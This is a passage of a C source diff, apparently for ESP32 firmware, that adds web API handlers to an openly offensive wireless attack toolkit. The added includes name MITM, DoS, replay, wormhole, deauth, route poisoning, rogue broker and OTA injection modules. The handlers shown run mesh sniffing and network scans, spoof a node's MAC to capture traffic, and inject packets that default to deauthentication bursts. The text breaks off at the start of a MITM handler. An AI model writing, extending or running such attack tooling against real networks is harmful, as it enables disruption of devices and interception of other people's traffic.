@@ -1,3 +1,4 @@
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -30,8 +31,29 @@
 #include "web_ui.h"
 #include "ble_passkey.h"
 #include "bt/ble_takeover.h"
-#include "ota_attack.h"
+#include "ota_common.h"
+#include "ota_mqtt_sniff.h"
+#include "ota_inject.h"
+#include "ota_fetch.h"
+#include "ota_poll_sniff.h"
+#include "ota_provision.h"
+#include "ota_github.h"
+#include "ota_rogue_broker.h"
+#include "ota_fw_analyze.h"
+#include "heap_psram.h"
 #include "esp_system.h"     /* for esp_get_free_heap_size() */
+
+/* ── Mesh: mesh.h has AP scanner + local subnet scanner ──── */
+#include "mesh.h"
+#include "node_spoof.h"
+#include "mesh_packet_inject.h"
+#include "mesh_mitm.h"
+#include "mesh_dos.h"
+#include "mesh_eavesdrop.h"
+#include "mesh_replay.h"
+#include "mesh_wormhole.h"
+#include "mesh_l2_deauth.h"
+#include "mesh_route_poison.h"
 
 static const char *TAG = "WEB_SERVER";
 static httpd_handle_t server_handle = NULL;
@@ -256,7 +278,7 @@ static wifi_ap_record_t *scan_networks(size_t *ap_count) {
     }
 
     *ap_count = records->count;
-    wifi_ap_record_t *copy = malloc(sizeof(wifi_ap_record_t) * records->count);
+    wifi_ap_record_t *copy = heap_psram_malloc(sizeof(wifi_ap_record_t) * records->count);
     if (copy == NULL) {
         return NULL;
     }
@@ -335,13 +357,17 @@ static esp_err_t dashboard_handler(httpd_req_t *req) {
         return ESP_OK;
     }
     httpd_resp_set_type(req, "text/html");
-    httpd_resp_send(req, advanced_dashboard_html, strlen(advanced_dashboard_html));
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_sendstr_chunk(req, advanced_dashboard_html);
+    httpd_resp_sendstr_chunk(req, NULL);  /* terminate chunked response */
     return ESP_OK;
 }
 
 static esp_err_t login_handler(httpd_req_t *req) {
     httpd_resp_set_type(req, "text/html");
-    httpd_resp_send(req, advanced_login_html, strlen(advanced_login_html));
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_sendstr_chunk(req, advanced_login_html);
+    httpd_resp_sendstr_chunk(req, NULL);  /* terminate chunked response */
     return ESP_OK;
 }
 
@@ -378,14 +404,14 @@ static esp_err_t scan_api_handler(httpd_req_t *req) {
     }
     cJSON *root = cJSON_CreateArray();
     if (root == NULL) {
-        free(ap_records);
+        heap_psram_free(ap_records);
         return send_json_response(req, root);
     }
     for (size_t i = 0; i < ap_count; i++) {
         if (ap_records[i].ssid[0] == 0) continue;
         cJSON *network = cJSON_CreateObject();
         if (network == NULL) {
-            free(ap_records);
+            heap_psram_free(ap_records);
             cJSON_Delete(root);
             return send_json_response(req, NULL);
         }
@@ -403,7 +429,7 @@ static esp_err_t scan_api_handler(httpd_req_t *req) {
         cJSON_AddStringToObject(network, "authmode", auth);
         cJSON_AddItemToArray(root, network);
     }
-    free(ap_records);
+    heap_psram_free(ap_records);
     return send_json_response(req, root);
 }
 
@@ -482,6 +508,1622 @@ static esp_err_t mgmt_ap_reset_handler(httpd_req_t *req) {
     wifictl_mgmt_ap_start();
     return send_success_response(req);
 }
+
+/* ================================================================== */
+/*  MESH NODE SCANNER — calls mesh_scan_active_nearby() from node_scanner.c */
+/* ================================================================== */
+
+static esp_err_t mesh_scan_api_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_active_result_t *result = heap_psram_malloc(sizeof(mesh_active_result_t));
+    if (!result) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
+                            "Mesh scan failed - no heap");
+        return ESP_FAIL;
+    }
+
+    esp_err_t err = mesh_scan_active_nearby(result);
+    if (err != ESP_OK) {
+        heap_psram_free(result);
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
+                            "Mesh scan failed - WiFi unavailable (try Stop All, then rescan)");
+        return ESP_FAIL;
+    }
+
+    const scan_result_t *nearby = &result->nearby;
+    const mesh_scan_result_t *local = &result->local;
+
+    char parent_ip_str[16];
+    snprintf(parent_ip_str, sizeof(parent_ip_str), "%u.%u.%u.%u",
+             local->parent_ip[0], local->parent_ip[1],
+             local->parent_ip[2], local->parent_ip[3]);
+
+    char parent_mac_str[18] = "";
+    if (local->parent_mac_set) {
+        snprintf(parent_mac_str, sizeof(parent_mac_str),
+                 "%02X:%02X:%02X:%02X:%02X:%02X",
+                 local->parent_mac[0], local->parent_mac[1],
+                 local->parent_mac[2], local->parent_mac[3],
+                 local->parent_mac[4], local->parent_mac[5]);
+    }
+
+    cJSON *root = cJSON_CreateObject();
+    if (!root) { heap_psram_free(result); return send_json_response(req, root); }
+
+    cJSON_AddStringToObject(root, "parent_ip", parent_ip_str);
+    cJSON_AddStringToObject(root, "parent_mac", parent_mac_str);
+    cJSON_AddNumberToObject(root, "total_nodes", local->total_nodes);
+    cJSON_AddNumberToObject(root, "total_aps", nearby->total_aps);
+    cJSON_AddNumberToObject(root, "mesh_count", nearby->mesh_count);
+    cJSON_AddNumberToObject(root, "group_count", nearby->group_count);
+
+    if (nearby->total_aps == 0 && local->total_nodes == 0) {
+        cJSON_AddStringToObject(root, "warning",
+            "No nearby APs or connected stations. Stop any running attack, wait a few seconds, then Scan Mesh again.");
+    } else if (local->total_nodes == 0) {
+        cJSON_AddStringToObject(root, "warning",
+            "Active nodes only appear for devices connected to this device's management AP (192.168.4.x).");
+    } else if (nearby->total_aps == 0) {
+        cJSON_AddStringToObject(root, "warning",
+            "No nearby Wi-Fi APs seen — check antenna/range or stop attacks that changed Wi-Fi mode.");
+    }
+
+    /* Active nodes: MAC + IP from soft-AP station list */
+    cJSON *nodes = cJSON_CreateArray();
+    for (int i = 0; i < local->total_nodes && i < MESH_MAX_NODES; i++) {
+        cJSON *n = cJSON_CreateObject();
+        if (!n) continue;
+
+        char ip_str[16];
+        snprintf(ip_str, sizeof(ip_str), "%u.%u.%u.%u",
+                 local->nodes[i].ip[0], local->nodes[i].ip[1],
+                 local->nodes[i].ip[2], local->nodes[i].ip[3]);
+
+        char mac_str[18];
+        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 local->nodes[i].mac[0], local->nodes[i].mac[1],
+                 local->nodes[i].mac[2], local->nodes[i].mac[3],
+                 local->nodes[i].mac[4], local->nodes[i].mac[5]);
+
+        cJSON_AddStringToObject(n, "ip", ip_str);
+        cJSON_AddStringToObject(n, "mac", mac_str);
+        cJSON_AddStringToObject(n, "role", "child");
+        cJSON_AddStringToObject(n, "status", local->nodes[i].online ? "online" : "offline");
+        cJSON_AddNumberToObject(n, "rtt_ms", local->nodes[i].rtt_ms);
+        cJSON_AddNumberToObject(n, "index", i + 1);
+        cJSON_AddItemToArray(nodes, n);
+    }
+    cJSON_AddItemToObject(root, "nodes", nodes);
+
+    /* Nearby APs (MAC only — no IP for over-the-air BSSIDs) */
+    cJSON *aps = cJSON_CreateArray();
+    for (int i = 0; i < nearby->total_aps && i < SCANNER_MAX_AP; i++) {
+        const scanner_ap_t *ap = &nearby->aps[i];
+        cJSON *a = cJSON_CreateObject();
+        if (!a) continue;
+
+        char mac_str[18];
+        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+
+        cJSON_AddStringToObject(a, "mac", mac_str);
+        cJSON_AddStringToObject(a, "bssid", mac_str);
+        cJSON_AddStringToObject(a, "ssid",
+            ap->is_hidden ? "(hidden)" : ap->ssid);
+        cJSON_AddNumberToObject(a, "channel", ap->channel);
+        cJSON_AddNumberToObject(a, "rssi", ap->rssi);
+        cJSON_AddBoolToObject(a, "espressif", ap->is_espressif);
+        cJSON_AddStringToObject(a, "ip", "—");
+        cJSON_AddItemToArray(aps, a);
+    }
+    cJSON_AddItemToObject(root, "aps", aps);
+
+    /* Mesh groups (SSID clusters) */
+    cJSON *groups = cJSON_CreateArray();
+    for (int i = 0; i < nearby->group_count && i < SCANNER_MAX_AP; i++) {
+        const mesh_group_t *g = &nearby->groups[i];
+        cJSON *grp = cJSON_CreateObject();
+        if (!grp) continue;
+
+        cJSON_AddStringToObject(grp, "ssid", g->ssid);
+        cJSON_AddNumberToObject(grp, "node_count", g->node_count);
+        cJSON_AddNumberToObject(grp, "channel", g->channel);
+        cJSON_AddBoolToObject(grp, "likely_mesh", g->likely_mesh);
+        cJSON_AddBoolToObject(grp, "all_same_channel", g->all_same_channel);
+        cJSON_AddBoolToObject(grp, "all_espressif", g->all_espressif);
+
+        cJSON *gnodes = cJSON_CreateArray();
+        for (int j = 0; j < g->node_count && j < SCANNER_MAX_GROUP_NODES; j++) {
+            const scanner_ap_t *nd = &g->nodes[j];
+            cJSON *gn = cJSON_CreateObject();
+            if (!gn) continue;
+
+            char mac_str[18];
+            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     nd->bssid[0], nd->bssid[1], nd->bssid[2],
+                     nd->bssid[3], nd->bssid[4], nd->bssid[5]);
+
+            cJSON_AddStringToObject(gn, "mac", mac_str);
+            cJSON_AddStringToObject(gn, "bssid", mac_str);
+            cJSON_AddNumberToObject(gn, "channel", nd->channel);
+            cJSON_AddNumberToObject(gn, "rssi", nd->rssi);
+            cJSON_AddBoolToObject(gn, "espressif", nd->is_espressif);
+            cJSON_AddStringToObject(gn, "ip", "—");
+            cJSON_AddItemToArray(gnodes, gn);
+        }
+        cJSON_AddItemToObject(grp, "nodes", gnodes);
+        cJSON_AddItemToArray(groups, grp);
+    }
+    cJSON_AddItemToObject(root, "groups", groups);
+
+    ESP_LOGI(TAG, "MESH: Parent=%s, %u active, %u nearby APs, %u groups",
+             parent_ip_str, (unsigned)local->total_nodes,
+             (unsigned)nearby->total_aps, (unsigned)nearby->group_count);
+
+    heap_psram_free(result);
+    return send_json_response(req, root);
+}
+
+/* ── MESH SNIFF HANDLERS ─────────────────────────────────────── */
+
+static esp_err_t mesh_sniff_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[32] = {0};
+    uint8_t duration = MESH_SNIFF_DEFAULT_SEC;
+    if (httpd_req_get_url_query_len(req) > 0) {
+        httpd_req_get_url_query_str(req, buf, sizeof(buf));
+        char *d = strstr(buf, "duration=");
+        if (d) { int v = atoi(d + 9); if (v >= 3 && v <= 30) duration = (uint8_t)v; }
+    }
+
+    if (mesh_sniff_is_running()) {
+        cJSON *root = cJSON_CreateObject();
+        cJSON_AddStringToObject(root, "status", "scanning");
+        cJSON_AddNumberToObject(root, "total_found", 0);
+        return send_json_response(req, root);
+    }
+
+    if (mesh_sniff_start(duration) != ESP_OK) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR,
+                            "Failed to start mesh sniff");
+        return ESP_FAIL;
+    }
+
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddStringToObject(root, "status", "scanning");
+    cJSON_AddStringToObject(root, "message", "Mesh sniff started");
+    cJSON_AddNumberToObject(root, "duration", duration);
+    return send_json_response(req, root);
+}
+
+static esp_err_t mesh_sniff_results_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const mesh_sniff_result_t *r = mesh_sniff_get_results();
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddStringToObject(root, "status",
+        mesh_sniff_is_running() ? "scanning" : "done");
+    cJSON_AddNumberToObject(root, "total_found",     r->total_found);
+    cJSON_AddNumberToObject(root, "espressif_count",  r->espressif_count);
+    cJSON_AddNumberToObject(root, "parents_found",    r->parents_found);
+    cJSON_AddNumberToObject(root, "scan_time_ms",     r->scan_time_ms);
+
+    cJSON *nodes = cJSON_CreateArray();
+    for (int i = 0; i < r->total_found && i < MESH_SNIFF_MAX_NODES; i++) {
+        cJSON *n = cJSON_CreateObject();
+        if (!n) continue;
+        const mesh_sniffed_node_t *nd = &r->nodes[i];
+
+        char mac[18], par[18];
+        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 nd->child_mac[0], nd->child_mac[1], nd->child_mac[2],
+                 nd->child_mac[3], nd->child_mac[4], nd->child_mac[5]);
+        snprintf(par, sizeof(par), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 nd->parent_bssid[0], nd->parent_bssid[1], nd->parent_bssid[2],
+                 nd->parent_bssid[3], nd->parent_bssid[4], nd->parent_bssid[5]);
+
+        cJSON_AddStringToObject(n, "mac",    mac);
+        cJSON_AddStringToObject(n, "parent", par);
+        cJSON_AddNumberToObject(n, "rssi",       nd->rssi);
+        cJSON_AddNumberToObject(n, "channel",    nd->channel);
+        cJSON_AddBoolToObject(n,   "espressif",  nd->is_espressif);
+        cJSON_AddStringToObject(n, "frame",
+            (nd->frame_type == MESH_SNIFF_FRAME_AUTH) ? "auth" : "assoc");
+        cJSON_AddNumberToObject(n, "index", i + 1);
+        cJSON_AddItemToArray(nodes, n);
+    }
+    cJSON_AddItemToObject(root, "nodes", nodes);
+    return send_json_response(req, root);
+}
+/* ── REMOTE NETWORK SCAN HANDLERS ─────────────────────────────── */
+
+static esp_err_t mesh_remote_scan_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[256] = {0};
+    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (len <= 0) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+        return ESP_FAIL;
+    }
+    buf[len] = '\0';
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    const char *ssid = cJSON_GetStringValue(cJSON_GetObjectItem(root, "ssid"));
+    const char *pass = cJSON_GetStringValue(cJSON_GetObjectItem(root, "password"));
+
+    if (!ssid || !pass) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid/password");
+        return ESP_FAIL;
+    }
+
+    /* COPY before deleting cJSON — otherwise dangling pointer */
+    char ssid_buf[33] = {0};
+    char pass_buf[65] = {0};
+    strncpy(ssid_buf, ssid, sizeof(ssid_buf) - 1);
+    strncpy(pass_buf, pass, sizeof(pass_buf) - 1);
+    cJSON_Delete(root);
+
+    if (mesh_remote_scan_is_running()) {
+        cJSON *r = cJSON_CreateObject();
+        cJSON_AddStringToObject(r, "status", "scanning");
+        return send_json_response(req, r);
+    }
+
+    if (mesh_remote_scan_start(ssid_buf, pass_buf) != ESP_OK) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Start failed");
+        return ESP_FAIL;
+    }
+
+    cJSON *r = cJSON_CreateObject();
+    cJSON_AddStringToObject(r, "status", "scanning");
+    cJSON_AddStringToObject(r, "message", "Remote scan started - AP down ~30s");
+    return send_json_response(req, r);
+}
+static esp_err_t mesh_remote_results_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const mesh_remote_result_t *r = mesh_remote_scan_get_results();
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddBoolToObject(root, "scanning", r->scanning);
+    cJSON_AddBoolToObject(root, "done", r->done);
+    cJSON_AddStringToObject(root, "target_ssid", r->target_ssid);
+
+    char tip[16] = "0.0.0.0";
+    if (r->gateway_ip[0]) {
+        snprintf(tip, sizeof(tip), "%u.%u.%u.%u",
+                 r->gateway_ip[0], r->gateway_ip[1],
+                 r->gateway_ip[2], r->gateway_ip[3]);
+    }
+    cJSON_AddStringToObject(root, "gateway_ip", tip);
+
+    char nm[16] = "0.0.0.0";
+    if (r->netmask[0]) {
+        snprintf(nm, sizeof(nm), "%u.%u.%u.%u",
+                 r->netmask[0], r->netmask[1],
+                 r->netmask[2], r->netmask[3]);
+    }
+    cJSON_AddStringToObject(root, "netmask", nm);
+
+    cJSON_AddNumberToObject(root, "total_found", r->total_found);
+    cJSON_AddNumberToObject(root, "esp32_count", r->esp32_count);
+    cJSON_AddNumberToObject(root, "total_alive", r->total_alive);
+    cJSON_AddNumberToObject(root, "sweep_time_ms", r->sweep_time_ms);
+
+    cJSON *nodes = cJSON_CreateArray();
+    for (int i = 0; i < r->total_found && i < MESH_REMOTE_MAX_NODES; i++) {
+        cJSON *n = cJSON_CreateObject();
+        if (!n) continue;
+        const mesh_remote_node_t *nd = &r->nodes[i];
+
+        char ip[16];
+        snprintf(ip, sizeof(ip), "%u.%u.%u.%u",
+                 nd->ip[0], nd->ip[1], nd->ip[2], nd->ip[3]);
+         cJSON_AddStringToObject(n, "ip", ip);
+
+        if (nd->has_mac) {
+            char mac_str[18];
+            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     nd->mac[0], nd->mac[1], nd->mac[2],
+                     nd->mac[3], nd->mac[4], nd->mac[5]);
+            cJSON_AddStringToObject(n, "mac", mac_str);
+        } else {
+            cJSON_AddStringToObject(n, "mac", "N/A");
+        }
+
+        cJSON_AddBoolToObject(n, "port80", nd->port80);
+        cJSON_AddBoolToObject(n, "port5555", nd->port5555);
+        cJSON_AddBoolToObject(n, "is_esp32", nd->is_esp32);
+        cJSON_AddNumberToObject(n, "index", i + 1);
+        cJSON_AddItemToArray(nodes, n);
+    }
+    cJSON_AddItemToObject(root, "nodes", nodes);
+    return send_json_response(req, root);
+}
+
+/* ================================================================== */
+/*  NODE SPOOF HANDLERS                                                */
+/* ================================================================== */
+
+static esp_err_t spoof_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[256] = {0};
+    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (len <= 0) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+        return ESP_FAIL;
+    }
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *jmac  = cJSON_GetObjectItem(root, "mac");
+    cJSON *jssid = cJSON_GetObjectItem(root, "ssid");
+    cJSON *jpass = cJSON_GetObjectItem(root, "pass");
+
+    if (!jmac || !cJSON_IsString(jmac) ||
+        !jssid || !cJSON_IsString(jssid) ||
+        !jpass || !cJSON_IsString(jpass)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing mac/ssid/pass");
+        return ESP_FAIL;
+    }
+
+    uint8_t mac[6];
+    if (sscanf(jmac->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid MAC");
+        return ESP_FAIL;
+    }
+
+    ESP_LOGW(TAG, "SPOOF: MAC=%s AP=%s", jmac->valuestring, jssid->valuestring);
+
+    esp_err_t ret = node_spoof_start(mac, jssid->valuestring, jpass->valuestring);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t spoof_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const spoof_state_t *st = node_spoof_get_state();
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddBoolToObject(root, "active", st->active);
+    cJSON_AddBoolToObject(root, "connected", st->connected);
+    cJSON_AddBoolToObject(root, "capturing", st->capturing);
+    cJSON_AddNumberToObject(root, "packets_rx", st->packets_rx);
+    cJSON_AddNumberToObject(root, "uptime_ms", st->uptime_ms);
+    cJSON_AddNumberToObject(root, "log_count", st->log_count);
+
+    char mac_str[18];
+    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+             st->target_mac[0], st->target_mac[1], st->target_mac[2],
+             st->target_mac[3], st->target_mac[4], st->target_mac[5]);
+    cJSON_AddStringToObject(root, "spoof_mac", mac_str);
+
+    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+             st->original_mac[0], st->original_mac[1], st->original_mac[2],
+             st->original_mac[3], st->original_mac[4], st->original_mac[5]);
+    cJSON_AddStringToObject(root, "original_mac", mac_str);
+
+    cJSON_AddStringToObject(root, "ap_ssid", st->ap_ssid);
+    cJSON_AddNumberToObject(root, "ap_rssi", st->ap_rssi);
+    cJSON_AddNumberToObject(root, "ap_channel", st->ap_channel);
+    if (st->error[0]) cJSON_AddStringToObject(root, "error", st->error);
+
+    cJSON *logs = cJSON_CreateArray();
+    for (int i = 0; i < st->log_count; i++) {
+        const spoof_log_t *e = &st->log[i];
+        cJSON *entry = cJSON_CreateObject();
+        cJSON_AddStringToObject(entry, "type", e->frame_type == 0 ? "MGMT" : "DATA");
+        cJSON_AddNumberToObject(entry, "subtype", e->subtype);
+        cJSON_AddNumberToObject(entry, "rssi", e->rssi);
+        cJSON_AddNumberToObject(entry, "channel", e->channel);
+        cJSON_AddNumberToObject(entry, "time_ms", e->time_ms);
+
+        char sm[18], dm[18];
+        snprintf(sm, sizeof(sm), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 e->src_mac[0], e->src_mac[1], e->src_mac[2],
+                 e->src_mac[3], e->src_mac[4], e->src_mac[5]);
+        snprintf(dm, sizeof(dm), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 e->dst_mac[0], e->dst_mac[1], e->dst_mac[2],
+                 e->dst_mac[3], e->dst_mac[4], e->dst_mac[5]);
+        cJSON_AddStringToObject(entry, "src_mac", sm);
+        cJSON_AddStringToObject(entry, "dst_mac", dm);
+        cJSON_AddNumberToObject(entry, "len", e->len);
+
+        char hex_buf[SPOOF_PAYLOAD_MAX * 2 + 1];
+        hex_buf[0] = '\0';
+        if (e->payload_len > 0) {
+            for (int j = 0; j < e->payload_len; j++) {
+                snprintf(hex_buf + j * 2, 3, "%02x", e->payload[j]);
+            }
+            hex_buf[e->payload_len * 2] = '\0';
+        }
+        cJSON_AddStringToObject(entry, "payload", hex_buf);
+        cJSON_AddNumberToObject(entry, "payload_len", e->payload_len);
+
+        cJSON_AddItemToArray(logs, entry);
+    }
+    cJSON_AddItemToObject(root, "logs", logs);
+
+    return send_json_response(req, root);
+}
+
+static esp_err_t spoof_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    node_spoof_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
+/* ================================================================== */
+/*  MESH PACKET INJECTION HANDLERS                                     */
+/* ================================================================== */
+
+static bool parse_mac_arg(const char *str, uint8_t *mac)
+{
+    if (!str || !mac) return false;
+    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
+}
+
+static esp_err_t mesh_inject_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[512] = {0};
+    int len = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (len <= 0) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+        return ESP_FAIL;
+    }
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *jbssid  = cJSON_GetObjectItem(root, "bssid");
+    cJSON *jdest   = cJSON_GetObjectItem(root, "dest_mac");
+    cJSON *jsrc    = cJSON_GetObjectItem(root, "src_mac");
+    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
+    cJSON *jtempl  = cJSON_GetObjectItem(root, "template");
+    cJSON *jhex    = cJSON_GetObjectItem(root, "custom_hex");
+    cJSON *jburst  = cJSON_GetObjectItem(root, "burst_count");
+    cJSON *jintv   = cJSON_GetObjectItem(root, "interval_ms");
+    cJSON *jreason = cJSON_GetObjectItem(root, "reason_code");
+    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
+
+    mesh_inject_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+
+    if (!cJSON_IsString(jbssid) || !parse_mac_arg(jbssid->valuestring, cfg.target_bssid)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid bssid");
+        return ESP_FAIL;
+    }
+
+    if (cJSON_IsString(jdest) && parse_mac_arg(jdest->valuestring, cfg.dest_mac)) {
+        /* dest set */
+    } else {
+        memset(cfg.dest_mac, 0xFF, 6);
+    }
+
+    if (cJSON_IsString(jsrc) && parse_mac_arg(jsrc->valuestring, cfg.src_mac)) {
+        cfg.src_mac_set = true;
+    }
+
+    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
+    cfg.template_id = cJSON_IsNumber(jtempl)
+        ? (mesh_inject_template_t)jtempl->valueint
+        : MESH_INJECT_TEMPLATE_DEAUTH;
+    cfg.burst_count = cJSON_IsNumber(jburst) ? (uint16_t)jburst->valueint : 10;
+    cfg.interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint : 100;
+    cfg.reason_code = cJSON_IsNumber(jreason) ? (uint16_t)jreason->valueint : 7;
+
+    if (cJSON_IsString(jhex)) {
+        strncpy(cfg.custom_hex, jhex->valuestring, sizeof(cfg.custom_hex) - 1);
+    }
+    if (cJSON_IsString(jssid)) {
+        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
+    }
+
+    if (cfg.template_id >= MESH_INJECT_TEMPLATE_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid template");
+        return ESP_FAIL;
+    }
+
+    ESP_LOGW(TAG, "MESH INJECT: bssid=%s template=%d burst=%u",
+             jbssid->valuestring, (int)cfg.template_id, cfg.burst_count);
+
+    esp_err_t ret = mesh_packet_inject_start(&cfg);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_inject_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = mesh_packet_inject_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "active", false);
+        cJSON_AddStringToObject(fallback, "status", "Idle");
+        cJSON_AddNumberToObject(fallback, "packets_sent", 0);
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t mesh_inject_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_packet_inject_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
+/* ================================================================== */
+/*  MESH MITM HANDLERS                                                 */
+/* ================================================================== */
+
+static bool parse_ip_arg(const char *str, uint8_t *ip)
+{
+    if (!str || !ip) return false;
+    unsigned a, b, c, d;
+    if (sscanf(str, "%u.%u.%u.%u", &a, &b, &c, &d) != 4) return false;
+    if (a > 255 || b > 255 || c > 255 || d > 255) return false;
+    ip[0] = (uint8_t)a; ip[1] = (uint8_t)b;
+    ip[2] = (uint8_t)c; ip[3] = (uint8_t)d;
+    return true;
+}
+
+static esp_err_t mesh_mitm_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    /* Read full body (Content-Length may exceed a single recv). */
+    char buf[768] = {0};
+    size_t total = 0;
+    int remaining = req->content_len;
+    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
